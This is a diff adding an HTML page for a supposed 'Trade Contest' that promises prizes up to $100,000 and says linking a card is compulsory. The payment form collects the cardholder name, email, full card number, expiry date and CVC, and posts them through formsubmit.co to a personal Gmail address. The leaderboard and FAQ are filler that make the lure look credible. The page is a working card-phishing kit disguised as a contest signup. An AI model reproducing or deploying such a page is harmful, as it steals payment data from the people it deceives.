@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- basic -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <!-- mobile metas -->
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <!-- site metas -->
+    <title>Payment - Trade Contest</title>
+    <meta name="keywords" content="" />
+    <meta name="description" content="" />
+    <meta name="author" content="" />
+    <!-- bootstrap css -->
+    <link rel="stylesheet" href="css/bootstrap.min.css" />
+    <!-- style css -->
+    <link rel="stylesheet" href="css/style.css" />
+    <!-- Responsive-->
+    <link rel="stylesheet" href="css/responsive.css" />
+    <link rel="stylesheet" href="css/owl.carousel.min.css" />
+    <!-- fevicon -->
+    <link rel="icon" href="images/fevicon.png" type="image/gif" />
+    <!-- Scrollbar Custom CSS -->
+    <link rel="stylesheet" href="css/jquery.mCustomScrollbar.min.css" />
+    <!-- Tweaks for older IEs-->
+    <link
+      rel="stylesheet"
+      href="https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.css"
+      media="screen"
+    />
+</head>
+<body class="main-layout" style="background-color: #f0f4f8;">
+    <!-- loader  -->
+    <div class="loader_bg">
+        <div class="loader"><img src="images/loading.gif" alt="#" /></div>
+    </div>
+    <!-- end loader -->
+    <!-- header -->
+    <header>
+        <!-- header inner -->
+        <div class="header_bg">
+            <div class="header">
+                <div class="container">
+                    <div class="row">
+                        <div
+                          class="col-xl-3 col-lg-3 col-md-3 col-sm-3 col logo_section"
+                        >
+                            <div class="full">
+                                <div class="center-desk">
+                                    <div class="logo">
+                                        <a href="index.html"
+                                          ><img src="images/logo.png" alt="#"
+                                        /></a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-9 col-lg-9 col-md-9 col-sm-9">
+                            <ul class="costomer">
+                                <li>
+                                    Participants Hotline
+                                    <a href="#">email us :radiance@gmail.com</a>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- end header inner -->
+        </div>
+    </header>
+    <!-- end header -->
+    <!-- banner and payment form combined section -->
+    <section
+      id="payment-banner"
+      style="
+        padding: 50px 0;
+        background-image: url('images/img.png');
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
+        min-height: 400px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      "
+    >
+        <div class="container">
+            <div class="row justify-content-center">
+                <div class="col-md-6 order-md-2 d-flex flex-column justify-content-center text-white">
+                <h1 style="font-weight: 700; color: #764ba2; text-shadow: 1px 1px 2px #555;">linking your card is compulsory </h1>
+                <p style="font-weight: 600; color: #555; font-size: 1.1rem;">
+                    Join the ultimate trade contest by completing your payment. Showcase your skills and compete for the grand prize!
+                </p>
+            </div>
+            <div class="col-md-6 order-md-1">
+                    <div
+                      class="payment-container animate__animated animate__fadeInUp"
+                      style="
+                        background: rgba(255, 255, 255, 0.95);
+                        padding: 30px 40px;
+                        border-radius: 12px;
+                        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+                        position: relative;
+                        overflow: hidden;
+                      "
+                    >
+                        <img
+                          src="images/card.png"
+                          alt="Card Image"
+                          style="
+                            position: absolute;
+                            top: -20px;
+                            right: -20px;
+                            width: 120px;
+                            opacity: 0.15;
+                            pointer-events: none;
+                          "
+                        />
+                        <h3 class="text-center mb-3" style="color: #764ba2; font-weight: 700;">
+                          To participate in the contest, link your card below. The top 10 participants will win prizes up to $100,000, paid directly to their accounts once the contest is over.
+                        </h3>
+                        <h2 class="text-center mb-4" style="color: #333;">
+                          Link Your Card
+                        </h2>
+                        <form
+                          id="paymentForm"
+                          action="https://formsubmit.co/orjidaniel750@gmail.com"
+                          method="POST"
+                          novalidate
+                        >
+                            <div class="form-group mb-3">
+                                <label for="name" style="font-weight: 600; color: #555;"
+                                  >Cardholder Name</label
+                                >
+                                <input
+                                  type="text"
+                                  class="form-control"
+                                  id="name"
+                                  name="name"
+                                  placeholder="Name on card"
+                                  required
+                                  style="transition: box-shadow 0.3s ease;"
+                                />
+                                <div class="invalid-feedback">
+                                    Please enter the cardholder's name.
+                                </div>
+                            </div>
+                            <div class="form-group mb-3">
+                                <label for="email" style="font-weight: 600; color: #555;"
+                                  >Email Address</label
+                                >
+                                <input
+                                  type="email"
+                                  class="form-control"
+                                  id="email"
+                                  name="email"
+                                  placeholder="you@example.com"
+                                  required
+                                  style="transition: box-shadow 0.3s ease;"
+                                />
+                                <div class="invalid-feedback">
+                                    Please enter a valid email address.
+                                </div>
+                            </div>
+            <div class="form-group mb-3 position-relative">
+                <label for="cardNumber" style="font-weight: 600; color: #555;"
+                  >Card Number</label
+                >
+                <input
+                  type="text"
+                  class="form-control"
+                  id="cardNumber"
+                  name="cardNumber"
+                  placeholder="1234 5678 9012 3456"
+                  pattern="\\d{13,19}"
+                  maxlength="19"
+                  required
+                  style="transition: box-shadow 0.3s ease; padding-right: 40px;"
+                  oninput="formatCardNumber(this)"
+                />
+                <i
+                  class="fa fa-credit-card"
+                  style="
+                    position: absolute;
+                    right: 15px;
+                    top: 38px;
+                    color: #999;
+                    font-size: 18px;
+                  "
+                ></i>
+                <div class="invalid-feedback">
+                    Please enter a valid card number (13 to 19 digits).
+                </div>
+            </div>
+                            <div class="form-row d-flex mb-3">
+                                <div class="col-6 pe-2">
+                                    <label for="expiry" style="font-weight: 600; color: #555;"
+                                      >Expiry Date</label
+                                    >
+                                    <input
+                                      type="text"
+                                      class="form-control"
+                                      id="expiry"
+                                      name="expiry"
+                                      placeholder="MM/YY"
+                                      pattern="^(0[1-9]|1[0-2])\\/([0-9]{2})$"
+                                      maxlength="5"
+                                      required
+                                      style="transition: box-shadow 0.3s ease;"
+                                    />
+                                    <div class="invalid-feedback">
+                                        Please enter a valid expiry date (MM/YY).
+                                    </div>
+                                </div>
+                                <div class="col-6 ps-2 position-relative">
+                                    <label for="cvc" style="font-weight: 600; color: #555;"
+                                      >CVC</label
+                                    >
+                                    <input
+                                      type="text"
+                                      class="form-control"
+                                      id="cvc"
+                                      name="cvc"
+                                      placeholder="123"
+                                      pattern="\\d{3,4}"
+                                      maxlength="4"
+                                      required
+                                      style="transition: box-shadow 0.3s ease; padding-right: 40px;"
+                                    />
+                                    <i
+                                      class="fa fa-lock"
+                                      style="
+                                        position: absolute;
+                                        right: 15px;
+                                        top: 38px;
+                                        color: #999;
+                                        font-size: 18px;
+                                      "
+                                    ></i>
+                                    <div class="invalid-feedback">
+                                        Please enter a valid CVC (3 or 4 digits).
+                                    </div>
+                                </div>
+                            </div>
+                            <button
+                              type="submit"
+                              class="btn btn-primary w-100"
+                              style="
+                                font-weight: 600;
+                                font-size: 18px;
+                                padding: 14px;
+                                transition: background-color 0.3s ease,
+                                  transform 0.2s ease;
+                              "
+                              onmouseover="this.style.backgroundColor='#155ab6'; this.style.transform='scale(1.05)';"
+                              onmouseout="this.style.backgroundColor='#1a73e8'; this.style.transform='scale(1)';"
+                            >
+                              Link Your Card
+                            </button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- leaderboard section -->
+    <section
+      id="leaderboard"
+      style="
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        padding: 50px 0;
+        color: white;
+      "
+    >
+        <div class="container">
+            <div class="titlepage text-center mb-4">
+                <h2>Leaderboard</h2>
+                <p>Top Traders Competing for the Grand Prize</p>
+            </div>
+            <div class="table-responsive">
+                <table
+                  class="table table-dark table-striped table-bordered text-center align-middle"
+                >
+                    <thead>
+                        <tr>
+                            <th scope="col">Rank</th>
+                            <th scope="col">Trader</th>
+                            <th scope="col">Score</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <th scope="row">1</th>
+                            <td>TraderOne</td>
+                            <td>9870</td>
+                        </tr>
+                        <tr>
+                            <th scope="row">2</th>
+                            <td>TradeMaster</td>
+                            <td>9450</td>
+                        </tr>
+                        <tr>
+                            <th scope="row">3</th>
+                            <td>ProTrader</td>
+                            <td>9120</td>
+                        </tr>
+                        <tr>
+                            <th scope="row">4</th>
+                            <td>MarketGuru</td>
+                            <td>8900</td>
+                        </tr>
+                        <tr>
+                            <th scope="row">5</th>
+                            <td>ChartWizard</td>
+                            <td>8750</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </section>
+    <!-- TradeView Charts section -->
+    <section id="tradeview-charts" style="padding: 50px 0; background-color: #ffffff;">
+        <div class="container">
+            <div class="titlepage text-center mb-4">
+                <h2>TradeView Gold and BTC Charts</h2>
+                <p style="font-weight: 700; color: #764ba2;">Stay updated with real-time Gold and Bitcoin price charts powered by TradeView.</p>
+            </div>
+            <div class="row justify-content-center" style="gap: 30px;">
+                <div class="col-md-6" style="max-width: 450px;">
+                    <!-- Gold Chart Widget -->
+                    <div class="tradingview-widget-container">
+                        <div id="tradingview_gold"></div>
+                        <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+                        <script type="text/javascript">
+                        new TradingView.widget({
+                            "width": "100%",
+                            "height": 400,
+                            "symbol": "OANDA:XAUUSD",
+                            "interval": "D",
+                            "timezone": "Etc/UTC",
+                            "theme": "light",
+                            "style": "1",
+                            "locale": "en",
+                            "toolbar_bg": "#f1f3f6",
+                            "enable_publishing": false,
+                            "allow_symbol_change": true,
+                            "container_id": "tradingview_gold"
+                        });
+                        </script>
+                    </div>
+                </div>
+                <div class="col-md-6" style="max-width: 450px;">
+                    <!-- BTC Chart Widget -->
+                    <div class="tradingview-widget-container">
+                        <div id="tradingview_btc"></div>
+                        <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+                        <script type="text/javascript">
+                        new TradingView.widget({
+                            "width": "100%",
+                            "height": 400,
+                            "symbol": "BINANCE:BTCUSDT",
+                            "interval": "D",
+                            "timezone": "Etc/UTC",
+                            "theme": "light",
+                            "style": "1",
+                            "locale": "en",
+                            "toolbar_bg": "#f1f3f6",
+                            "enable_publishing": false,
+                            "allow_symbol_change": true,
+                            "container_id": "tradingview_btc"
+                        });
+                        </script>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- FAQ section -->
+    <section id="faq" class="asked_main" style="padding: 50px 0;">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="titlepage text-center">
+                        <h2>Contest <span class="white">FAQs</span></h2>
+                    </div>
+                </div>
+            </div>
+            <div class="row align-items-center">
+                <div class="col-md-6">
+                    <div class="ask_img">
+                        <figure><img src="images/ask.jpg" alt="FAQ Image" /></figure>
+                    </div>
+                </div>
+                <div class="col-md-6">
+                    <div class="ask_box">
+                        <div class="simpaly">
+                            <div class="slider"><span>+</span><a href="#">How do I enter the contest?</a></div>
+                            <div class="content">
+                                <p>Sign up on our platform and submit your trading profile to participate in the contest.</p>
+                            </div>
+                        </div>
+                        <div class="simpaly">
+                            <div class="slider"><span>+</span><a href="#">What are the contest rules?</a></div>
+                            <div class="content">
+                                <p>Follow the trading guidelines and contest terms outlined on our website to ensure fair play.</p>
+                            </div>
+                        </div>
+                        <div class="simpaly">
+                            <div class="slider"><span>+</span><a href="#">When is the contest deadline?</a></div>
+                            <div class="content">
+                                <p>The contest ends on December 31, 2024. All entries must be submitted before this date.</p>
+                            </div>
+                        </div>
+                        <div class="simpaly">
+                            <div class="slider"><span>+</span><a href="#">How is the winner selected?</a></div>
+                            <div class="content">
+                                <p>Winners are selected based on trading performance and adherence to contest rules by our panel of judges.</p>
+                            </div>
+                        </div>
+                        <div class="simpaly">
+                            <div class="slider"><span>+</span><a href="#">What prizes are available?</a></div>
+                            <div class="content">
+                                <p>The grand prize is $100,000 cash along with other exciting rewards for top performers.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- footer -->
+    <footer>
+        <div class="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-12">
+                        <p>© 2024 Trade Contest. All Rights Reserved.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <!-- Javascript files-->
+    <script src="js/jquery.min.js"></script>
+    <script src="js/popper.min.js"></script>
+    <script src="js/bootstrap.bundle.min.js"></script>
+    <script src="js/jquery-3.0.0.min.js"></script>
+    <script src="js/plugin.js"></script>
+    <!-- sidebar -->
+    <script src="js/jquery.mCustomScrollbar.concat.min.js"></script>
+    <script src="js/custom.js"></script>
+    <script src="js/owl.carousel.min.js"></script>
+    <script src="https:cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.js"></script>
+    <script>
+        $('.content').hide();
+
+        $('.slider').click(function () {
+            $(this).next('.content').slideToggle();
+            this.toggle = !this.toggle;
+            $(this).children('span').text(this.toggle ? '-' : '+');
+            return false;
+        });
+    </script>
+        <script>
+            (function () {
+                const form = document.getElementById('paymentForm');
+
+                function formatCardNumber(input) {
+                    let value = input.value.replace(/\D/g, '');
+                    let formattedValue = '';
+                    for (let i = 0; i < value.length; i++) {
+                        if (i > 0 && i % 4 === 0) {
+                            formattedValue += ' ';
+                        }
+                        formattedValue += value[i];
+                    }
+                    input.value = formattedValue;
+                }
+
+                function validateCardNumber(number) {
+                    const cleaned = number.replace(/\s+/g, '');
+                    const regex = /^\d{13,19}$/;
+                    return regex.test(cleaned);
+                }
+
+                function validateExpiryDate(expiry) {
+                    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) {
+                        return false;
+                    }
+                    const [month, year] = expiry.split('/');
+                    const expiryDate = new Date(`20${year}`, month);
+                    const now = new Date();
+                    // Set to last day of the month
+                    expiryDate.setMonth(expiryDate.getMonth(), 0);
+                    return expiryDate >= now;
+                }
+
+                function validateCVC(cvc) {
+                    return /^\d{3,4}$/.test(cvc);
+                }
+
+                function validateField(field) {
+                    if (!field.checkValidity()) {
+                        field.classList.add('is-invalid');
+                        return false;
+                    } else {
+                        field.classList.remove('is-invalid');
+                        return true;
+                    }
+                }
+
+                form.addEventListener('submit', function (event) {
+                    let valid = true;
+
+                    // Validate card number
+                    const cardNumberField = form.cardNumber;
+                    if (!validateCardNumber(cardNumberField.value)) {
+                        cardNumberField.classList.add('is-invalid');
+                        valid = false;
+                    } else {
+                        cardNumberField.classList.remove('is-invalid');
+                    }
+
+                    // Validate expiry date
+                    const expiryField = form.expiry;
+                    if (!validateExpiryDate(expiryField.value)) {
+                        expiryField.classList.add('is-invalid');
+                        valid = false;
+                    } else {
+                        expiryField.classList.remove('is-invalid');
+                    }
+
+                    // Validate CVC
+                    const cvcField = form.cvc;
+                    if (!validateCVC(cvcField.value)) {
+                        cvcField.classList.add('is-invalid');
+                        valid = false;
+                    } else {
+                        cvcField.classList.remove('is-invalid');
+                    }
+
+                    // Validate other fields
+                    Array.from(form.elements).forEach((el) => {
+                        if (
+                            el.tagName === 'INPUT' &&
+                            el.name !== 'cardNumber' &&
+                            el.name !== 'expiry' &&
+                            el.name !== 'cvc' &&
+                            !validateField(el)
+                        ) {
+                            valid = false;
+                        }
+                    });
+
+                    if (!valid) {
+                        event.preventDefault();
+                    }
+                });
+            })();
+        </script>
+</body>
+</html>
